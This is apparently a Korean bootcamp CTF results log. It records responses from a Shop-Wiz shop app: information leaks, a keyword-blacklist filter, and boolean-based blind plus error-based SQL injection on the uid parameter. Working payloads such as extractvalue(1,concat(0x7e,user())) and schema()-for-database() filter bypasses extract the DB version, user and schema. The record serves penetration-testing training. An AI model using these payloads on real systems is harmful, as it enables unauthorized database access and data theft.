# 요청 결과 전체 (All Results) — bootcamp-ctf-web

`all-requests.md`에 기록된 각 요청의 결과를 같은 순서·같은 번호로 대응해서, 생략 없이
기록한다.

## 결과 1 — CTL-RECON-001 (evidence_id: EVID-RECON-001)

```
HTTP_STATUS: 200
Server: Apache/2.2.34 (Unix)
X-Powered-By: PHP/5.2.17
```

응답 본문(발췌): `<title>무료 쇼핑몰 솔루션 - 숍위즈(http://www.shop-wiz.com)</title>`

- 판정: FACT — Apache 2.2.34 / PHP 5.2.17 위에서 "숍위즈(Shop-Wiz)" 쇼핑몰 솔루션이
  구동 중.

## 결과 2 — CTL-RECON-003 (evidence_id: EVID-RECON-002)

```
HTTP_STATUS: 200
```

응답 본문(발췌):
```
<br />
<b>Warning</b>:  array_flip() [<a href='function.array-flip'>function.array-flip</a>]:
The argument should be an array in <b>/usr/local/apache2/htdocs/wizmart.php</b> on line <b>161</b><br />
```

- 판정: FACT — `display_errors`가 켜져 있어 PHP Warning과 서버 절대 경로
  (`/usr/local/apache2/htdocs/wizmart.php`)가 그대로 노출됨.

## 결과 3 — CTL-RECON-004 (evidence_id: EVID-RECON-003)

```
HTTP_STATUS: 200
Content-Length: 65
```

응답 본문 전체:
```
<script>alert('잘못된 경로 사용');history.go(-1);</script>
```

- 판정: FACT — path traversal류 페이로드는 전부 이 동일한 차단 응답으로 걸러짐.
  `wizhtml.php` 단독으로는 LFI가 성립하지 않음(UNKNOWN: 정확한 필터 로직은 소스코드
  확인 전까지 미확정).

## 결과 4 — CTL-RECON-007 (evidence_id: EVID-RECON-004)

```
HTTP_STATUS: 200
Content-Length: 71
```

응답 본문 전체:
```
<script>alert('\n\n폴더가 존재하지 않습니다.\n\n');</script>
```

- 판정: FACT — `BID`는 실제 디렉터리/화이트리스트 존재 여부로 검증되며, quote
  삽입은 단순히 "존재하지 않는 폴더"로 처리됨. 이 경로 단독으로는 SQLi 증거 없음.

## 결과 5 — CTL-RECON-008 (evidence_id: EVID-RECON-005)

```
HTTP_STATUS: 200
```

응답 본문(발췌, baseline `keyword=test` 대비 diff):
```
< test검색어로 총
---
> \'검색어로 총
경고: Division by zero in /usr/local/apache2/htdocs/lib/class.common.php on line 1386/1387/1390
```

- 판정: FACT — `keyword='` 입력이 응답에 `\'`(백슬래시 이스케이프된 형태)로 나타남 —
  `magic_quotes_gpc`(또는 동등한 이스케이프 처리)가 켜져 있어 문자열 컨텍스트
  quote-기반 SQLi는 이 지점에서 직접 성립하지 않는 것으로 판단(INFERENCE). 검색
  결과 0건으로 인한 "Division by zero" 경고는 발생하나 SQL 에러는 아님.

## 결과 6 — CTL-EXPLOIT-001 (evidence_id: EVID-EXPLOIT-001)

```
HTTP_STATUS: 302
Location: /
```

- 판정: FACT — `uid=1`(정상값, 참 조건과 동일 효과)일 때 `Location: /`로 리다이렉트.

## 결과 7 — CTL-EXPLOIT-002 (evidence_id: EVID-EXPLOIT-002)

```
HTTP_STATUS: 302
Location: (empty)
```

- 판정: FACT — 존재하지 않는 `uid=99999`일 때 `Location` 헤더 값이 빈 문자열.

## 결과 8 — CTL-EXPLOIT-003 (evidence_id: EVID-EXPLOIT-003)

```
HTTP_STATUS: 302
Location: /
```

- 판정: FACT — `uid=1 AND 1=1`(참) → 결과 6과 동일하게 `Location: /`.

## 결과 9 — CTL-EXPLOIT-004 (evidence_id: EVID-EXPLOIT-004)

```
HTTP_STATUS: 302
Location: (empty)
```

- 판정: FACT — `uid=1 AND 1=2`(거짓) → 결과 7과 동일하게 빈 `Location`.
  결과 6~9를 종합하면 **boolean-based blind SQL Injection**이 `uid` 파라미터에서
  성립함(FACT — 조건의 참/거짓에 따라 응답이 결정적으로 달라짐, 4회 반복 일관됨).

## 결과 10 — CTL-EXPLOIT-005 (evidence_id: EVID-EXPLOIT-005)

```
HTTP_STATUS: 200
```

응답 본문 전체:
```
<br> ------------------------------ <br>Error : You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for the right syntax
to use near 'strING(VERSION(),1,1)=5' at line 1<br>OutPut Message : select url from
wizbanner where uid=1 AND sub strING(VERSION(),1,1)=5<br> ------------------------------ <br>
```

- 판정: FACT — 서버가 **실행된 SQL 쿼리 원문을 에러 메시지에 그대로 노출**함
  (`select url from wizbanner where uid=1 AND ...`) — 테이블명 `wizbanner`, 컬럼명
  `url` 확인. `SUBSTRING`이 `sub strING`으로 깨진 것으로 보아 특정 키워드에 공백을
  삽입하는 블랙리스트 필터가 존재함(INFERENCE).

## 결과 11 — CTL-EXPLOIT-006 (evidence_id: EVID-EXPLOIT-006)

```
HTTP_STATUS: 200
```

응답 본문 전체:
```
<br> ------------------------------ <br>Error : XPATH syntax error: '~5.1.73'<br>
OutPut Message : select url from wizbanner where uid=1 AND extractvalue(1,concat(0x7e,version()))<br> ------------------------------ <br>
```

- 판정: FACT — `extractvalue()`는 필터를 우회함. **MySQL 버전 `5.1.73`이 에러
  메시지를 통해 그대로 추출됨** — error-based SQL Injection으로 임의 데이터 추출이
  가능함을 확인.

## 결과 12 — CTL-EXPLOIT-007 (evidence_id: EVID-EXPLOIT-007)

```
HTTP_STATUS: 200
```

응답 본문 전체:
```
<br> ------------------------------ <br>Error : You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for the right syntax
to use near 'datexml(1,concat(0x7e,data base()),1)' at line 1<br>OutPut Message :
select url from wizbanner where uid=1 AND up datexml(1,concat(0x7e,data base()),1)<br> ------------------------------ <br>
```

- 판정: FACT — `updatexml`은 `up datexml`로, `database`는 `data base`로 각각 공백이
  삽입되어 깨짐 — 두 키워드 모두 필터 대상(INFERENCE: 블랙리스트에
  "update", "database" 등의 하위 문자열이 포함된 것으로 추정).

## 결과 13 — CTL-EXPLOIT-008 (evidence_id: EVID-EXPLOIT-008)

```
HTTP_STATUS: 200
```

응답 본문 전체:
```
<br> ------------------------------ <br>Error : XPATH syntax error: '~wizmall@172.18.0.3'<br>
OutPut Message : select url from wizbanner where uid=1 AND extractvalue(1,concat(0x7e,user()))<br> ------------------------------ <br>
```

- 판정: FACT — DB 접속 계정 `wizmall@172.18.0.3`이 그대로 추출됨.

## 결과 14 — CTL-EXPLOIT-009 (evidence_id: EVID-EXPLOIT-009)

```
HTTP_STATUS: 200
```

응답 본문 전체:
```
<br> ------------------------------ <br>Error : XPATH syntax error: '~wizmall'<br>
OutPut Message : select url from wizbanner where uid=1 AND extractvalue(1,concat(0x7e,schema()))<br> ------------------------------ <br>
```

- 판정: FACT — 현재 스키마명 `wizmall`이 그대로 추출됨(`database()` 필터를
  동의어 `schema()`로 우회). 이 이상의 데이터(테이블 목록, 회원 정보 등)는
  Scope의 Credential 수집 금지 조항에 따라 추가로 시도하지 않음(학생 결정 대기).

## 관련 파일

- 보낸 요청: `evidence/all-requests.md`
- 원본 구조화 기록: `execution/vulnerable.json`, `execution/patched.json`
